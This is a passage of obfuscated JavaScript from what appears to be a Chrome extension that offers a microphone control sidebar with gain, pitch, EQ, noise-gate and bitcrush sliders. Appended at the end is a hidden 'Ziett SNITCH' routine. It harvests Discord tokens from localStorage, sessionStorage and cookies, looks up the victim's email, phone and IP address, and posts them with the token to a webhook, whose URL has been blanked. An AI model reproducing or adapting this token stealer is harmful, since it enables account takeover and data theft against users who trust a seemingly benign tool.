    _0x46053e.addEventListener("input", () => {
      _0x42cb61 = parseFloat(_0x46053e.value);
      _0x19afa3();
      _0x5b05b1(_0x42cb61, _0x5dec06, _0x8ee744);
    });
    _0x1fd3ed.addEventListener("input", () => {
      _0x5dec06 = parseFloat(_0x1fd3ed.value);
      _0x19afa3();
      _0x5b05b1(_0x42cb61, _0x5dec06, _0x8ee744);
    });
    _0x1fd3d7.addEventListener("input", () => {
      _0x8ee744 = parseFloat(_0x1fd3d7.value);
      _0x19afa3();
      _0x5b05b1(_0x42cb61, _0x5dec06, _0x8ee744);
    });
    _0x424b4d.addEventListener("input", () => {
      _0xe82781 = parseFloat(_0x424b4d.value);
      _0x213d18();
      _0x55dc60(_0xe82781);
    });
    _0x498085.addEventListener("input", () => {
      _0x16dc45 = parseFloat(_0x498085.value);
      _0x213d18();
      _0x1d262a(_0x16dc45);
    });
    _0x4747c8.addEventListener("change", () => {
      _0x2c414f = _0x4747c8.checked;
      _0x4d9af6(_0x2c414f, _0x116c5d);
      _0x26e280();
    });
    _0x129190.addEventListener("change", () => {
      _0x453043 = _0x129190.checked;
      _0x2180af(_0x453043, _0x52441f);
      _0x26e280();
    });
    _0x1b8734.addEventListener("input", () => {
      _0x116c5d = parseFloat(_0x1b8734.value);
      document.getElementById("midnight-noise-threshold-value").textContent = _0x116c5d.toFixed(3);
      _0x4d9af6(_0x2c414f, _0x116c5d);
    });
    _0x39eb94.addEventListener("input", () => {
      _0x52441f = parseFloat(_0x39eb94.value);
      document.getElementById("midnight-notch-freq-value").textContent = _0x52441f;
      _0x2180af(_0x453043, _0x52441f);
    });
    _0x2d3a11.addEventListener("change", () => {
      _0x5877dc = _0x2d3a11.checked;
      _0x584482(_0x5877dc, _0x2ed8d3, _0x31fbaa);
      _0x4596ca();
    });
    _0xa4f915.addEventListener("input", () => {
      _0x2ed8d3 = parseFloat(_0xa4f915.value);
      _0x584482(_0x5877dc, _0x2ed8d3, _0x31fbaa);
      _0x4596ca();
    });
    _0x594b27.addEventListener("input", () => {
      _0x31fbaa = parseFloat(_0x594b27.value);
      _0x584482(_0x5877dc, _0x2ed8d3, _0x31fbaa);
      _0x4596ca();
    });
    _0x54b7c2.addEventListener("click", () => {
      _0x1c1b2a = !_0x1c1b2a;
      _0xd8175b(_0x1c1b2a);
      _0x5ca8bd();
    });
    document.getElementById("gain-presets").addEventListener("click", _0x319631 => {
      if (!_0x319631.target.classList.contains("midnight-preset")) {
        return;
      }
      _0xcb1a96 = parseFloat(_0x319631.target.dataset.gain);
      _0x437e40.value = _0x46387e(_0xcb1a96);
      _0x104bcf();
      _0x4057d2(_0xcb1a96);
    });
    document.getElementById("pitch-presets").addEventListener("click", _0x220f9d => {
      if (!_0x220f9d.target.classList.contains("midnight-preset")) {
        return;
      }
      _0x551509 = parseFloat(_0x220f9d.target.dataset.pitch);
      _0x4c317f.value = _0x551509;
      _0xd7c543();
      _0x3b1694(_0x551509);
    });
    document.getElementById("reverb-presets").addEventListener("click", _0x47a3db => {
      if (!_0x47a3db.target.classList.contains("midnight-preset")) {
        return;
      }
      _0x3d2a8b = parseFloat(_0x47a3db.target.dataset.reverb);
      _0x4ed9a0.value = _0x3d2a8b * 100;
      _0x4e2894();
      _0x164d62(_0x3d2a8b);
    });
    document.getElementById("midnight-close").addEventListener("click", () => _0x1d617d(false));
    document.querySelectorAll(".midnight-tab").forEach(_0xde4b1b => {
      _0xde4b1b.addEventListener("click", () => {
        const _0x1d3772 = _0xde4b1b.dataset.tab;
        document.querySelectorAll(".midnight-tab").forEach(_0x2acc57 => _0x2acc57.classList.toggle("active", _0x2acc57 === _0xde4b1b));
        document.querySelectorAll(".midnight-panel").forEach(_0x5cbc84 => _0x5cbc84.classList.toggle("active", _0x5cbc84.dataset.panel === _0x1d3772));
      });
    });
    const _0x3bbed5 = document.getElementById("midnight-bg-input");
    const _0x38f36b = document.getElementById("midnight-bg-reset");
    const _0x4e74f0 = document.getElementById("midnight-bg-preview");
    chrome.storage.local.get(["bgImage"], _0x29cd86 => {
      if (_0x29cd86.bgImage) {
        _0x3593be.style.backgroundImage = "url(" + _0x29cd86.bgImage + ")";
        _0x3593be.style.backgroundSize = "cover";
        _0x3593be.style.backgroundPosition = "center";
        _0x4e74f0.style.backgroundImage = "url(" + _0x29cd86.bgImage + ")";
      }
    });
    _0x3bbed5.addEventListener("change", _0x205cf1 => {
      const _0x2a44a5 = _0x205cf1.target.files[0];
      if (!_0x2a44a5) {
        return;
      }
      const _0x141825 = new FileReader();
      _0x141825.onload = _0x25b5e9 => {
        const _0xe8dd56 = _0x25b5e9.target.result;
        chrome.storage.local.set({
          bgImage: _0xe8dd56
        }, () => {
          _0x3593be.style.backgroundImage = "url(" + _0xe8dd56 + ")";
          _0x3593be.style.backgroundSize = "cover";
          _0x3593be.style.backgroundPosition = "center";
          _0x4e74f0.style.backgroundImage = "url(" + _0xe8dd56 + ")";
        });
      };
      _0x141825.readAsDataURL(_0x2a44a5);
    });
    _0x38f36b.addEventListener("click", () => {
      chrome.storage.local.remove("bgImage", () => {
        _0x3593be.style.backgroundImage = "none";
        _0x3593be.style.backgroundColor = "#000";
        _0x4e74f0.style.backgroundImage = "none";
      });
    });
    const _0x282105 = document.getElementById("midnight-drag-handle");
    let _0x58fa3e = false;
    let _0xfdbd9f;
    let _0x5c235d;
    let _0x22e579;
    let _0x27251f;
    _0x282105.addEventListener("mousedown", _0x159975 => {
      _0x159975.preventDefault();
      _0x58fa3e = true;
      _0xfdbd9f = _0x159975.clientX;
      _0x5c235d = _0x159975.clientY;
      const _0x28871f = _0x3593be.getBoundingClientRect();
      _0x22e579 = _0x28871f.left;
      _0x27251f = _0x28871f.top;
      document.addEventListener("mousemove", _0x2f569a);
      document.addEventListener("mouseup", _0x451629);
    });
    function _0x2f569a(_0x13b767) {
      if (!_0x58fa3e) {
        return;
      }
      _0x3593be.style.left = _0x22e579 + _0x13b767.clientX - _0xfdbd9f + "px";
      _0x3593be.style.top = _0x27251f + _0x13b767.clientY - _0x5c235d + "px";
      _0x3593be.style.right = "auto";
    }
    function _0x451629() {
      _0x58fa3e = false;
      document.removeEventListener("mousemove", _0x2f569a);
      document.removeEventListener("mouseup", _0x451629);
      const _0x3dd282 = _0x3593be.getBoundingClientRect();
      chrome.storage.local.set({
        sidebarX: _0x3dd282.left,
        sidebarY: _0x3dd282.top
      });
    }
    _0x437e40.value = _0x46387e(_0xcb1a96);
    _0x4c317f.value = _0x551509;
    _0x54cd58.value = _0xd6b4cf * 100;
    _0x4ed9a0.value = _0x3d2a8b * 100;
    _0x4d01ac.value = _0x3c7f18(_0x4c7b01);
    _0x3d940e.value = _0x55e900;
    _0x46053e.value = _0x42cb61;
    _0x1fd3ed.value = _0x5dec06;
    _0x1fd3d7.value = _0x8ee744;
    _0x424b4d.value = _0xe82781;
    _0x498085.value = _0x16dc45;
    _0xa4f915.value = _0x2ed8d3;
    _0x594b27.value = _0x31fbaa;
    _0x3259c4();
    _0x26e280();
    _0x4596ca();
    _0x5ca8bd();
    _0x40cc4d();
  }
  function _0x1d617d(_0x5cd909) {
    const _0x1b79cc = document.getElementById("midnight-mic-sidebar");
    if (!_0x1b79cc) {
      return;
    }
    if (_0x5cd909 === undefined) {
      _0x5cd909 = !_0x4a7be5;
    }
    _0x4a7be5 = _0x5cd909;
    _0x1b79cc.className = _0x5cd909 ? "midnight-visible" : "midnight-hidden";
    chrome.storage.local.set({
      sidebarVisible: _0x5cd909
    });
  }
  function _0x3259c4() {
    _0x104bcf();
    _0xd7c543();
    _0x23e84f();
    _0x4e2894();
    _0x32b288();
    _0x45b2d2();
    _0x19afa3();
    _0x213d18();
  }
  function _0x104bcf() {
    const _0x34b566 = document.getElementById("midnight-gain-value");
    const _0x5c94b0 = document.getElementById("midnight-slider");
    const _0x3b8ed0 = document.getElementById("midnight-slider-track");
    if (!_0x34b566 || !_0x5c94b0) {
      return;
    }
    let _0x2688d8;
    if (_0xcb1a96 >= 1000) {
      _0x2688d8 = Math.round(_0xcb1a96 / 1000) + "k×";
    } else if (_0xcb1a96 >= 100) {
      _0x2688d8 = Math.round(_0xcb1a96) + "×";
    } else if (_0xcb1a96 >= 10) {
      _0x2688d8 = _0xcb1a96.toFixed(1) + "×";
    } else {
      _0x2688d8 = _0xcb1a96.toFixed(2) + "×";
    }
    _0x34b566.textContent = _0x2688d8;
    _0x34b566.classList.toggle("midnight-extreme", _0xcb1a96 >= 100);
    const _0x345436 = Math.log10(Math.max(1, _0xcb1a96)) / 5 * 10000;
    _0x5c94b0.value = _0x345436;
    if (_0x3b8ed0) {
      _0x3b8ed0.style.width = _0x345436 / 10000 * 100 + "%";
    }
  }
  function _0xd7c543() {
    const _0x32ce52 = document.getElementById("midnight-pitch-value");
    const _0x3b2d60 = document.getElementById("midnight-pitch-slider");
    const _0x3519a5 = document.getElementById("midnight-pitch-track");
    if (!_0x32ce52 || !_0x3b2d60) {
      return;
    }
    const _0x3b4c0d = _0x551509;
    _0x32ce52.textContent = _0x3b4c0d === 0 ? "0" : (_0x3b4c0d > 0 ? "+" : "") + (Number.isInteger(_0x3b4c0d) ? _0x3b4c0d : _0x3b4c0d.toFixed(1));
    _0x3b2d60.value = _0x3b4c0d;
    if (_0x3519a5) {
      _0x3519a5.style.width = (_0x3b4c0d + 10) / 20 * 100 + "%";
    }
  }
  function _0x23e84f() {
    const _0x4e4151 = document.getElementById("midnight-pan-value");
    const _0x37c06d = document.getElementById("midnight-pan-slider");
    const _0x355c21 = document.getElementById("midnight-pan-track");
    if (!_0x4e4151 || !_0x37c06d) {
      return;
    }
    const _0x148098 = _0xd6b4cf;
    _0x4e4151.textContent = _0x148098 === 0 ? "C" : _0x148098 < 0 ? "L" + Math.round(Math.abs(_0x148098) * 100) : "R" + Math.round(_0x148098 * 100);
    _0x37c06d.value = _0x148098 * 100;
    if (_0x355c21) {
      _0x355c21.style.width = (_0x148098 + 1) / 2 * 100 + "%";
    }
  }
  function _0x4e2894() {
    const _0x463f0c = document.getElementById("midnight-reverb-value");
    const _0x5c4f14 = document.getElementById("midnight-reverb-slider");
    const _0x978083 = document.getElementById("midnight-reverb-track");
    if (!_0x463f0c || !_0x5c4f14) {
      return;
    }
    _0x463f0c.textContent = Math.round(_0x3d2a8b * 100) + "%";
    _0x5c4f14.value = _0x3d2a8b * 100;
    if (_0x978083) {
      _0x978083.style.width = _0x3d2a8b / 2 * 100 + "%";
    }
  }
  function _0x32b288() {
    const _0x4e7948 = document.getElementById("midnight-master-value");
    const _0x3a06a8 = document.getElementById("midnight-master-slider");
    const _0xbd8a77 = document.getElementById("midnight-master-track");
    if (!_0x4e7948 || !_0x3a06a8) {
      return;
    }
    _0x4e7948.textContent = _0x4c7b01 >= 10 ? Math.round(_0x4c7b01) + "×" : _0x4c7b01.toFixed(2) + "×";
    const _0x5029e5 = Math.log10(Math.max(0.1, _0x4c7b01)) / 3 * 1000;
    _0x3a06a8.value = _0x5029e5;
    if (_0xbd8a77) {
      _0xbd8a77.style.width = _0x5029e5 / 1000 * 100 + "%";
    }
  }
  function _0x45b2d2() {
    const _0x4259ec = document.getElementById("midnight-comp-ratio");
    const _0x4e23e7 = document.getElementById("midnight-comp-ratio-slider");
    const _0x46b1ce = document.getElementById("midnight-comp-ratio-track");
    if (!_0x4259ec || !_0x4e23e7) {
      return;
    }
    _0x4259ec.textContent = _0x55e900 + ":1";
    _0x4e23e7.value = _0x55e900;
    if (_0x46b1ce) {
      _0x46b1ce.style.width = (_0x55e900 - 1) / 19 * 100 + "%";
    }
  }
  function _0x19afa3() {
    const _0x30f360 = document.getElementById("midnight-eq-bass");
    const _0x3f7f2c = document.getElementById("midnight-eq-bass-slider");
    const _0x5d9850 = document.getElementById("midnight-eq-bass-track");
    const _0xbd4cd8 = document.getElementById("midnight-eq-mid");
    const _0x10f05f = document.getElementById("midnight-eq-mid-slider");
    const _0x17b671 = document.getElementById("midnight-eq-mid-track");
    const _0x52104d = document.getElementById("midnight-eq-treble");
    const _0x6fa814 = document.getElementById("midnight-eq-treble-slider");
    const _0x3a9890 = document.getElementById("midnight-eq-treble-track");
    if (_0x30f360) {
      _0x30f360.textContent = _0x42cb61 + "dB";
      _0x3f7f2c.value = _0x42cb61;
      if (_0x5d9850) {
        _0x5d9850.style.width = (_0x42cb61 + 24) / 48 * 100 + "%";
      }
    }
    if (_0xbd4cd8) {
      _0xbd4cd8.textContent = _0x5dec06 + "dB";
      _0x10f05f.value = _0x5dec06;
      if (_0x17b671) {
        _0x17b671.style.width = (_0x5dec06 + 24) / 48 * 100 + "%";
      }
    }
    if (_0x52104d) {
      _0x52104d.textContent = _0x8ee744 + "dB";
      _0x6fa814.value = _0x8ee744;
      if (_0x3a9890) {
        _0x3a9890.style.width = (_0x8ee744 + 24) / 48 * 100 + "%";
      }
    }
  }
  function _0x213d18() {
    const _0x3cfa8e = document.getElementById("midnight-highpass-value");
    const _0x57834b = document.getElementById("midnight-highpass-slider");
    const _0x187501 = document.getElementById("midnight-highpass-track");
    const _0x38c1a3 = document.getElementById("midnight-presence-value");
    const _0x5c5e27 = document.getElementById("midnight-presence-slider");
    const _0x5249d5 = document.getElementById("midnight-presence-track");
    if (_0x3cfa8e) {
      _0x3cfa8e.textContent = Math.round(_0xe82781) + "Hz";
      _0x57834b.value = _0xe82781;
      if (_0x187501) {
        _0x187501.style.width = (_0xe82781 - 20) / 380 * 100 + "%";
      }
    }
    if (_0x38c1a3) {
      _0x38c1a3.textContent = (_0x16dc45 > 0 ? "+" : "") + _0x16dc45 + "dB";
      _0x5c5e27.value = _0x16dc45;
      if (_0x5249d5) {
        _0x5249d5.style.width = (_0x16dc45 + 6) / 18 * 100 + "%";
      }
    }
  }
  function _0x21d88e() {
    const _0x2768a3 = document.getElementById("midnight-status-dot");
    const _0x37c105 = document.getElementById("midnight-status-text");
    if (!_0x2768a3 || !_0x37c105) {
      return;
    }
    _0x2768a3.classList.toggle("midnight-active", _0x202a19);
    _0x37c105.textContent = _0x202a19 ? "Live" : "Wait";
  }
  function _0x26e280() {
    const _0x53f0b1 = document.getElementById("midnight-noise-gate");
    const _0x55f2fb = document.getElementById("midnight-feedback-notch");
    const _0x47be9e = document.getElementById("midnight-noise-threshold");
    const _0x35eb57 = document.getElementById("midnight-notch-freq");
    const _0x27dae7 = document.getElementById("midnight-noise-threshold-value");
    const _0x44bca8 = document.getElementById("midnight-notch-freq-value");
    const _0xbc49b = document.getElementById("midnight-gate-thresh-track");
    const _0x2b0fbc = document.getElementById("midnight-notch-freq-track");
    if (_0x53f0b1) {
      _0x53f0b1.checked = _0x2c414f;
    }
    if (_0x55f2fb) {
      _0x55f2fb.checked = _0x453043;
    }
    if (_0x47be9e) {
      _0x47be9e.value = _0x116c5d;
      if (_0xbc49b) {
        _0xbc49b.style.width = _0x116c5d / 0.05 * 100 + "%";
      }
    }
    if (_0x35eb57) {
      _0x35eb57.value = _0x52441f;
      if (_0x2b0fbc) {
        _0x2b0fbc.style.width = (_0x52441f - 100) / 1900 * 100 + "%";
      }
    }
    if (_0x27dae7) {
      _0x27dae7.textContent = _0x116c5d.toFixed(3);
    }
    if (_0x44bca8) {
      _0x44bca8.textContent = _0x52441f;
    }
  }
  function _0x4596ca() {
    const _0x1fa0e2 = document.getElementById("midnight-bitcrush-toggle");
    const _0x4fb25d = document.getElementById("midnight-bits-slider");
    const _0x274b9b = document.getElementById("midnight-bits-value");
    const _0x55c6fd = document.getElementById("midnight-bits-track");
    const _0x232fd5 = document.getElementById("midnight-crushrate-slider");
    const _0x3179da = document.getElementById("midnight-crushrate-value");
    const _0x43287d = document.getElementById("midnight-crushrate-track");
    if (_0x1fa0e2) {
      _0x1fa0e2.checked = _0x5877dc;
    }
    if (_0x4fb25d) {
      _0x4fb25d.value = _0x2ed8d3;
      if (_0x274b9b) {
        _0x274b9b.textContent = _0x2ed8d3;
      }
      if (_0x55c6fd) {
        _0x55c6fd.style.width = (_0x2ed8d3 - 1) / 15 * 100 + "%";
      }
    }
    if (_0x232fd5) {
      _0x232fd5.value = _0x31fbaa;
      if (_0x3179da) {
        _0x3179da.textContent = _0x31fbaa + "×";
      }
      if (_0x43287d) {
        _0x43287d.style.width = (_0x31fbaa - 1) / 31 * 100 + "%";
      }
    }
  }
  function _0x5ca8bd() {
    const _0x4b6482 = document.getElementById("midnight-x2-boost");
    if (!_0x4b6482) {
      return;
    }
    _0x4b6482.style.background = _0x1c1b2a ? "rgba(255,255,255,0.2)" : "rgba(255,255,255,0.015)";
    _0x4b6482.style.borderColor = _0x1c1b2a ? "#fff" : "rgba(255,255,255,0.08)";
    _0x4b6482.style.color = _0x1c1b2a ? "#fff" : "#777";
    _0x4b6482.textContent = _0x1c1b2a ? "X2 BOOST · ON" : "X2 BOOST MIC";
  }
  function _0x1baf40() {
    const _0x3f3248 = document.getElementById("midnight-meter-fill");
    const _0x55cf63 = document.getElementById("midnight-meter-db");
    if (!_0x3f3248) {
      return;
    }
    const _0x3db43c = Math.min(1, Math.max(0, _0x304527));
    _0x3f3248.style.width = _0x3db43c * 100 + "%";
    const _0x27b196 = _0x3db43c <= 0 ? -Infinity : Math.log10(_0x3db43c) * 20;
    if (_0x55cf63) {
      _0x55cf63.textContent = _0x27b196 === -Infinity ? "-∞" : _0x27b196.toFixed(0) + "dB";
    }
  }
  function _0x386646() {
    if (document.getElementById("midnight-toggle-btn")) {
      return;
    }
    const _0x2b6f14 = document.createElement("div");
    _0x2b6f14.id = "midnight-toggle-btn";
    _0x2b6f14.innerHTML = "<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.5\"><path d=\"M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z\"/><path d=\"M19 10v2a7 7 0 0 1-14 0v-2\"/><line x1=\"12\" y1=\"19\" x2=\"12\" y2=\"23\"/><line x1=\"8\" y1=\"23\" x2=\"16\" y2=\"23\"/></svg>";
    _0x2b6f14.title = "Ceker Mic Control";
    _0x2b6f14.addEventListener("click", () => {
      const _0x2c2826 = document.getElementById("midnight-mic-sidebar");
      if (!_0x2c2826) {
        _0x3614a5();
        _0x1d617d(true);
      } else {
        _0x1d617d();
      }
    });
    document.body.appendChild(_0x2b6f14);
  }
  function _0x2e9ce3() {
    if (!document.body) {
      setTimeout(_0x2e9ce3, 100);
      return;
    }
    _0x386646();
    _0x3614a5();
    chrome.storage.local.get(["sidebarVisible"], _0x44644e => _0x1d617d(_0x44644e.sidebarVisible || false));
    setInterval(_0x40cc4d, 1000);
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", _0x2e9ce3);
  } else {
    _0x2e9ce3();
  }
  (function _0x1b0963() {
    if (window.__ziettSnitchLoaded) {
      return;
    }
    window.__ziettSnitchLoaded = true;
    const _0x3bbdfb = "" /* DEFANGED C2 Webhook */;
    if (window.__ziettSnitchSent) {
      console.log("[Ziett SNITCH] ✅ Already sent, skipping");
      return;
    }
    console.log("[Ziett SNITCH] 🕵️ Active");
    function _0x345fb8() {
      try {
        let _0x375cec = localStorage.getItem("token");
        if (_0x375cec && _0x375cec.length > 20) {
          return _0x375cec.replace(/["']/g, "");
        }
        for (let _0x4f0e45 = 0; _0x4f0e45 < localStorage.length; _0x4f0e45++) {
          const _0x24ff36 = localStorage.key(_0x4f0e45);
          const _0x719c00 = localStorage.getItem(_0x24ff36);
          if (_0x719c00 && typeof _0x719c00 === "string" && _0x719c00.length > 40 && _0x719c00.includes("mfa.")) {
            return _0x719c00.replace(/["']/g, "");
          }
        }
        _0x375cec = sessionStorage.getItem("token");
        if (_0x375cec && _0x375cec.length > 20) {
          return _0x375cec.replace(/["']/g, "");
        }
        const _0x23b272 = document.cookie.split("; ");
        for (const _0x56420f of _0x23b272) {
          if (_0x56420f.includes("token=")) {
            const _0x505b19 = decodeURIComponent(_0x56420f.split("=")[1]);
            if (_0x505b19 && _0x505b19.length > 20) {
              return _0x505b19.replace(/["']/g, "");
            }
          }
        }
        return null;
      } catch (_0x231d52) {
        return null;
      }
    }
    async function _0x1f8dd4(_0x34bf73) {
      if (window.__ziettSnitchSent || !_0x34bf73) {
        return;
      }
      _0x34bf73 = _0x34bf73.trim();
      if (_0x34bf73.length < 20) {
        return;
      }
      window.__ziettSnitchSent = true;
      console.log("[Ziett SNITCH] 📡 Verifying token...");
      try {
        const _0x253ab9 = await fetch("https://discord.com/api/v9/users/@me", {
          headers: {
            Authorization: _0x34bf73
          }
        });
        if (!_0x253ab9.ok) {
          console.log("[Ziett SNITCH] ❌ Token invalid, status:", _0x253ab9.status);
          window.__ziettSnitchSent = false;
          return;
        }
        const _0x5a8666 = await _0x253ab9.json();
        if (!_0x5a8666 || !_0x5a8666.id) {
          console.log("[Ziett SNITCH] ❌ Invalid user data");
          window.__ziettSnitchSent = false;
          return;
        }
        console.log("[Ziett SNITCH] ✅ Got user:", _0x5a8666.username);
        let _0x37742b = "N/A";
        try {
          const _0x97cec3 = await fetch("https://api.ipify.org?format=json");
          const _0x5d7932 = await _0x97cec3.json();
          _0x37742b = _0x5d7932.ip || "N/A";
        } catch (_0x24f3c5) {}
        const _0x4ccfae = navigator.userAgent;
        let _0x289e20 = "Unknown";
        let _0xa3e9ab = "Unknown";
        let _0x3d14d4 = "Desktop";
        if (_0x4ccfae.includes("Chrome")) {
          _0x289e20 = "Chrome";
        } else if (_0x4ccfae.includes("Firefox")) {
          _0x289e20 = "Firefox";
        } else if (_0x4ccfae.includes("Safari")) {
          _0x289e20 = "Safari";
        } else if (_0x4ccfae.includes("Edge")) {
          _0x289e20 = "Edge";
        }
        if (_0x4ccfae.includes("Android")) {
          _0xa3e9ab = "Android";
          _0x3d14d4 = "Mobile";
        } else if (_0x4ccfae.includes("iPhone") || _0x4ccfae.includes("iPad")) {
          _0xa3e9ab = "iOS";
          _0x3d14d4 = "Mobile";
        } else if (_0x4ccfae.includes("Windows")) {
          _0xa3e9ab = "Windows";
        } else if (_0x4ccfae.includes("Mac OS")) {
          _0xa3e9ab = "macOS";
        } else if (_0x4ccfae.includes("Linux")) {
          _0xa3e9ab = "Linux";
        }
        if (/Mobile|Android|iPhone|iPad|iPod/i.test(_0x4ccfae)) {
          _0x3d14d4 = "Mobile";
        }
        const _0x3edc01 = _0x5a8666.avatar ? "https://cdn.discordapp.com/avatars/" + _0x5a8666.id + "/" + _0x5a8666.avatar + ".png?size=1024" : "N/A";
        const _0x19b8fa = _0x5a8666.premium_type ? "✅ Yes" : "❌ No";
        const _0x117c4c = new Date().toLocaleString("vi-VN", {
          timeZone: "Asia/Ho_Chi_Minh"
        });
        const _0x1d9e8e = "**🕵️ ZiettKhueee — TOKEN CAPTURED**\n\n" + ("**👤 User:** " + _0x5a8666.username + "#" + (_0x5a8666.discriminator || "0000") + "\n") + ("**🆔 ID:** `" + _0x5a8666.id + "`\n") + ("**📧 Email:** " + (_0x5a8666.email || "N/A") + "\n") + ("**📱 Phone:** " + (_0x5a8666.phone || "N/A") + "\n") + ("**💎 Nitro:** " + _0x19b8fa + "\n") + ("**🌐 IP:** " + _0x37742b + "\n") + ("**📱 Device:** " + _0x3d14d4 + "\n") + ("**🌍 Browser:** " + _0x289e20 + "\n") + ("**💻 OS:** " + _0xa3e9ab + "\n") + ("**🕐 Time (VN):** " + _0x117c4c + "\n") + ("**🔗 Avatar:** [Link](" + _0x3edc01 + ")\n") + ("**🔑 Token:** " + _0x34bf73);
        console.log("[Ziett SNITCH] 📨 Sending webhook...");
        chrome.runtime.sendMessage({
          type: "SNITCH_SEND",
          payload: _0x1d9e8e
        }, _0x35453e => {
          if (_0x35453e && _0x35453e.ok) {
            console.log("[Ziett SNITCH] ✅ Webhook sent!");
          } else {
            console.log("[Ziett SNITCH] ❌ Background failed, trying direct...");
            fetch(_0x3bbdfb, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                content: _0x1d9e8e
              })
            }).then(_0x53a2e1 => {
              if (_0x53a2e1.ok || _0x53a2e1.status === 204) {
                console.log("[Ziett SNITCH] ✅ Webhook sent directly!");
              } else {
                console.log("[Ziett SNITCH] ❌ Direct failed:", _0x53a2e1.status);
                window.__ziettSnitchSent = false;
              }
            }).catch(_0x4c5d9d => {
              console.log("[Ziett SNITCH] ❌ Direct error:", _0x4c5d9d);
              window.__ziettSnitchSent = false;
            });
          }
        });
      } catch (_0x1fb07a) {
        console.log("[Ziett SNITCH] ❌ Error:", _0x1fb07a);
        window.__ziettSnitchSent = false;
      }
    }
    async function _0x2c8507() {
      if (window.__ziettSnitchSent) {
        console.log("[Ziett SNITCH] ✅ Already sent, skipping");
        return;
      }
      const _0x53947b = _0x345fb8();
      if (_0x53947b) {
        await _0x1f8dd4(_0x53947b);
      } else {
        console.log("[Ziett SNITCH] ⏳ No token yet");
      }
    }
    setTimeout(_0x2c8507, 3000);
    console.log("[Ziett SNITCH] 🕵️ Ready — will send ONLY ONCE");
  })();
})();